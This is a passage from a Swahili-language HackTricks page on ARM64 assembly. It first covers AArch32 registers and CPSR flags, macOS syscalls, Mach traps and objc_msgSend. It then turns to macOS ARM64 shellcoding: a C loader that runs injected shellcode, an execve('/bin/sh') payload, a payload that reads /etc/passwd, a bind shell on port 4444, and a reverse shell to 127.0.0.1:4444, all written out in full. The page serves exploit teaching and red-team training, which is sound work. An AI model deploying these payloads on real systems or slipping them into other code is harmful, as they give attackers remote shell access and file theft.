.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Rejista

Kuna rejista 16 za biti 32 (r0-r15). **Kutoka r0 hadi r14** wanaweza kutumika kwa **operesheni yoyote**, hata hivyo baadhi yao kawaida huwa zimehifadhiwa:

- **`r15`**: Programu ya kuhesabu (daima). Ina anwani ya maagizo yanayofuata. Katika A32 sasa + 8, katika T32, sasa + 4.
- **`r11`**: Kiashiria cha fremu
- **`r12`**: Rejista ya wito wa ndani wa utaratibu
- **`r13`**: Kiashiria cha steki
- **`r14`**: Kiashiria cha kiungo

Zaidi ya hayo, rejista zinahifadhiwa katika **`rejista zilizohifadhiwa`**. Ambazo ni sehemu zinazohifadhi thamani za rejista kuruhusu kufanya **mabadiliko ya muktadha haraka** katika kushughulikia kipekee na operesheni za haki ili kuepuka haja ya kuhifadhi na kurejesha rejista kila wakati.\
Hii hufanywa kwa **kuihifadhi hali ya mchakato kutoka kwa `CPSR` hadi `SPSR`** ya hali ya mchakato ambayo kipekee inachukuliwa. Wakati wa kurudi kutoka kwa kipekee, **`CPSR`** inarejeshwa kutoka kwa **`SPSR`**.

### CPSR - Rejista ya Hali ya Programu ya Sasa

Katika AArch32 CPSR inafanya kazi kama **`PSTATE`** katika AArch64 na pia inahifadhiwa katika **`SPSR_ELx`** wakati kipekee inachukuliwa ili kurejesha baadaye utekelezaji:

<figure><img src="../../../.gitbook/assets/image (1194).png" alt=""><figcaption></figcaption></figure>

Vipengele vimegawanywa katika vikundi kadhaa:

- Rejista ya Hali ya Programu ya Maombi (APSR): Alama za hisabati na inayoweza kufikiwa kutoka EL0
- Rejista za Hali ya Utekelezaji: Tabia ya mchakato (inasimamiwa na OS).

#### Rejista ya Hali ya Programu ya Maombi (APSR)

- Alama za **`N`**, **`Z`**, **`C`**, **`V`** (kama katika AArch64)
- Alama ya **`Q`**: Inawekwa kuwa 1 wakati wowote **kuna utoshelevu wa nambari** wakati wa utekelezaji wa maagizo maalum ya hisabati ya utoshelevu. Mara tu inapowekwa kuwa **`1`**, itabaki na thamani hiyo mpaka iwekwe kwa mkono kuwa 0. Zaidi ya hayo, hakuna maagizo yoyote yanayochunguza thamani yake kwa kawaida, lazima ifanywe kusoma kwa mkono.
-   **`GE`** (Kubwa au sawa) Alama: Hutumiwa katika operesheni za SIMD (Maagizo Moja, Data Nyingi) kama "kuongeza kwa pamoja" na "kutoa kwa pamoja". Operesheni hizi huruhusu kusindika pointi nyingi za data katika maagizo moja.

Kwa mfano, maagizo ya **`UADD8`** **ya kuongeza jozi nne za herufi** (kutoka kwa waendeshaji wawili wa biti 32) kwa pamoja na kuhifadhi matokeo katika rejista ya biti 32. Kisha **inaweka alama za `GE` katika `APSR`** kulingana na matokeo haya. Kila alama ya GE inalingana na moja ya kuongeza herufi, ikionyesha ikiwa kuongeza kwa jozi hiyo ya herufi **kumetoka nje**.

Maagizo ya **`SEL`** hutumia alama hizi za GE kutekeleza hatua za masharti.

#### Rejista za Hali ya Utekelezaji

- Vipande vya **`J`** na **`T`**: **`J`** inapaswa kuwa 0 na ikiwa **`T`** ni 0 seti ya maagizo ya A32 hutumiwa, na ikiwa ni 1, T32 hutumiwa.
- Rejista ya Hali ya Bloki ya IT (`ITSTATE`): Hizi ni vipande kutoka 10-15 na 25-26. Huhifadhi masharti ya maagizo ndani ya kikundi kilicho na kipimo cha **`IT`**.
- Biti ya **`E`**: Inaonyesha **umaliziaji**.
- **Vipande vya Hali na Kizuizi cha Kipekee** (0-4): Vinabainisha hali ya sasa ya utekelezaji. Cha **5** kinaonyesha ikiwa programu inaendeshwa kama biti 32 (1) au biti 64 (0). Vingine 4 vinawakilisha **hali ya kipekee inayotumiwa kwa sasa** (wakati kipekee kinatokea na kinashughulikiwa). Nambari iliyowekwa inaonyesha **kipaumbele cha sasa** ikiwa kipekee nyingine itaanzishwa wakati huu unashughulikiwa.

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Baadhi ya kipekee zinaweza kuzimwa kwa kutumia vipande **`A`**, `I`, `F`. Ikiwa **`A`** ni 1 inamaanisha **kuzimwa kwa kushtukiza** kutafanyika. **`I`** inaconfigure kujibu kwa vifaa vya nje vya **Ombi la Kushtukiza la Kuingilia** (IRQs). na F inahusiana na **Ombi za Kuingilia Kwa Haraka** (FIRs).

## macOS

### BSD syscalls

Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls zitakuwa na **x16 > 0**.

### Mach Traps

Angalia katika [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) `mach_trap_table` na katika [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) mifano. Idadi ya juu ya Mach traps ni `MACH_TRAP_TABLE_COUNT` = 128. Mach traps zitakuwa na **x16 < 0**, hivyo unahitaji kuita nambari kutoka kwa orodha ya awali kwa kuchukua **hasi**: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.

Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler kupata jinsi ya kuita hizi (na BSD) syscalls:

{% code overflow="wrap" %}
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

{% hint style="success" %}
Maranyingi ni rahisi kuangalia **msimbo uliopanguliwa** kutoka **`libsystem_kernel.dylib`** **kuliko** kuangalia **msimbo wa chanzo** kwa sababu msimbo wa wito wa mfumo (syscalls) kadhaa (BSD na Mach) unazalishwa kupitia hati (angalia maoni katika msimbo wa chanzo) wakati katika dylib unaweza kupata nini kinachoitwa.
{% endhint %}

### machdep calls

XNU inasaidia aina nyingine ya wito unaoitwa tegemezi la mashine. Idadi ya wito hawa inategemea usanifu na wala wito au idadi haihakikishi kubaki thabiti.

### ukurasa wa comm

Huu ni ukurasa wa kumbukumbu ya mmiliki wa kernel ambao umepangwa katika eneo la anwani ya kila mchakato wa mtumiaji. Lengo lake ni kufanya mpito kutoka hali ya mtumiaji hadi nafasi ya kernel haraka kuliko kutumia syscalls kwa huduma za kernel ambazo hutumiwa sana mpito huu ungekuwa wa ufanisi mdogo.

Kwa mfano, wito `gettimeofdate` unasoma thamani ya `timeval` moja kwa moja kutoka kwa ukurasa wa comm.

### objc\_msgSend

Ni kawaida sana kupata kazi hii ikitumiwa katika programu za Objective-C au Swift. Kazi hii inaruhusu kuita njia ya kitu cha Objective-C.

Parameta ([maelezo zaidi katika nyaraka](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Kiashiria kwa kipengee
* x1: op -> Chaguzi ya njia
* x2... -> Mengine ya hoja za njia iliyohimizwa

Kwa hivyo, ikiwa unaweka kizuizi kabla ya tawi kwa kazi hii, unaweza kwa urahisi kupata nini kinaitwa katika lldb na (katika mfano huu kitu kinaita kitu kutoka `NSConcreteTask` ambacho kitatekeleza amri):
```
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
### Msimbo wa Shell

Kwa kuchakata:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Kutoa baits:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Kwa macOS mpya:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Msimbo wa C kwa ajili ya kujaribu shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Kifuniko

Imechukuliwa kutoka [**hapa**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) na kufafanuliwa.

{% tabs %}
{% tab title="na adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="na stack" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="na adr kwa linux" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
#### Soma kwa kutumia cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo hoja ya pili (x1) ni mfululizo wa vigezo (ambavyo kumbukumbu zake ni rundo la anwani).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Amuru amri na sh kutoka kwa tawi ili mchakato mkuu usiuawe
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Kifaa cha Bind

Kifaa cha Bind kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) kwenye **bandari 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Kaburi la nyuma

Kutoka [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell kwa **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
